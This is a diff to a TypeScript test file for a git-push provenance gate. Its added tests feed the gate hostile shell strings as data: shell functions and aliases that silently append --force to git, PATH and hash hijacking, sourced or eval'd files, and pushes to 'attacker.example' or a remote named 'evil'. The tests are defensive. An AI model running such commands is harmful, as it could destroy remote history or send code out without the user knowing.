@@ -27,13 +27,21 @@ describe("gate-measured git push provenance (#63)", () => {
 		expect(measureGitPushProvenance("echo hello", "/tmp")).toBeUndefined();
 		// A push without a refspec names nothing to measure.
 		expect(measureGitPushProvenance("git push origin", "/tmp")).toBeUndefined();
-		expect(measureGitPushProvenance("git push origin main", "/tmp")).toBeDefined();
+		// Outside a repository no remote is known by name, so nothing is measured.
+		expect(measureGitPushProvenance("git push origin main", "/tmp")).toBeUndefined();
 	});
 
 	test("push refs parse: remote, local, remote side, plus and flags tolerated", () => {
-		// against a nonexistent cwd: plumbing returns nulls, parse still visible
-		const p = measureGitPushProvenance("git push origin +feature/some:feature/some --force-with-lease", "/definitely/not/a/repo");
-		expect(p?.ahead).toBeNull();
+		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
+		try {
+			git("git init -q -b main && git commit -q --allow-empty -m base && git remote add origin https://example.invalid/repo.git", dir);
+			// A known remote with no tracking ref yet: the parse is visible as null tips.
+			const p = measureGitPushProvenance("git push origin +feature/some:feature/some --force-with-lease", dir);
+			expect(p?.remoteTip).toBeNull();
+			expect(p?.ahead).toBeNull();
+		} finally {
+			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
+		}
 	});
 
 	test("equal tips: forwardOnly true, ahead 0 behind 0", () => {
@@ -242,6 +250,50 @@ describe("gate-measured git push provenance (#63)", () => {
 		}
 	});
 
+	test("a push after anything that can redefine git or its PATH is not measured", () => {
+		// Without force syntax a push cannot discard, unless the shell no longer
+		// runs git for `git`: a function, an alias, a PATH or a sourced file can
+		// add `--force` behind a plain-looking push.
+		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
+		try {
+			git("git init -q -b main && git commit -q --allow-empty -m base && git update-ref refs/remotes/origin/main HEAD", dir);
+			for (const command of [
+				'git(){ command git "$@" --force; }; git push origin main',
+				"function git { command git \"$@\" --force; }; git push origin main",
+				"shopt -s expand_aliases; alias git='git -c x=y'; git push origin main",
+				"PATH=/tmp/wrapped:$PATH; git push origin main",
+				"export PATH=/tmp/wrapped:$PATH && git push origin main",
+				"source ./env.sh && git push origin main",
+				". ./env.sh && git push origin main",
+				"hash -p /tmp/wrapped/git git; git push origin main",
+				"eval \"$(cat defs)\"; git push origin main",
+			]) {
+				expect(measureGitPushProvenance(command, dir), command).toBeUndefined();
+			}
+			// A prefix assignment on another command changes only that command.
+			expect(measureGitPushProvenance("CI=1 bun test && git push origin main", dir)?.forwardOnly).toBe(true);
+		} finally {
+			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
+		}
+	});
+
+	test("a push to anything but a configured remote name is not measured", () => {
+		// A URL or a path is not a remote the repository tracks: its tracking ref
+		// never exists, and a null remote tip there would read as a new branch on
+		// the user's own remote while the commits go somewhere else.
+		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
+		try {
+			git("git init -q -b main && git commit -q --allow-empty -m base && git remote add origin https://example.invalid/repo.git && git update-ref refs/remotes/origin/main HEAD", dir);
+			expect(measureGitPushProvenance("git push origin main", dir)?.forwardOnly).toBe(true);
+			expect(measureGitPushProvenance("git push origin main:new-branch", dir)?.remoteTip).toBeNull();
+			for (const command of ["git push https://attacker.example/repo.git main", "git push ../elsewhere.git main", "git push evil main"]) {
+				expect(measureGitPushProvenance(command, dir), command).toBeUndefined();
+			}
+		} finally {
+			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
+		}
+	});
+
 	test("a HEAD refspec on a detached HEAD names no remote branch, so nothing is measured", () => {
 		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
 		try {
@@ -273,14 +325,11 @@ describe("gate-measured git push provenance (#63)", () => {
 		}
 	});
 
-	test("an untracked remote yields null tips, not a guess", () => {
+	test("a push to a URL, not a remote the repository knows, yields no provenance", () => {
 		const dir = mkdtempSync(join(tmpdir(), "jev63-"));
 		try {
 			git("git init -q -b main && git commit -q --allow-empty -m base", dir);
-			const p = measureGitPushProvenance("git push https://example.com/x.git main:main", dir);
-			expect(p?.remoteTip).toBeNull();
-			expect(p?.localTip).not.toBeNull();
-			expect(p?.forwardOnly).toBeUndefined();
+			expect(measureGitPushProvenance("git push https://example.com/x.git main:main", dir)).toBeUndefined();
 		} finally {
 			execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
 		}
